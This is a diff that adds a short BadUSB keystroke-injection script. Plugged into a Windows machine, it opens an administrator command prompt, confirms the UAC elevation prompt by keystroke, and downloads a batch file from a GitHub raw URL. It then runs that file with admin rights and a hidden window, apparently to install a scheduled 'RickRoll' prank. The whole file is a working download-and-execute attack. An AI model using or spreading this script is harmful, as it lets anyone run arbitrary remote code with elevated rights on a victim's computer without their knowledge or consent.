@@ -1,0 +1,12 @@
+DELAY 2000
+GUI r
+DELAY 500
+ALTSTRING cmd
+CTRL-SHIFT ENTER
+DELAY 5000
+ALT Y
+DELAY 1000
+ALTSTRING cd "%homepath%"
+ENTER
+ALTSTRING Powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Babyporkchop/Scripts/main/BadUSBScripts/RickRoll/TaskSchedularRickRoll/Start.bat -OutFile .\Start.bat;Start-Process Start.bat -Verb runas -windowstyle hidden && exit
+ENTER
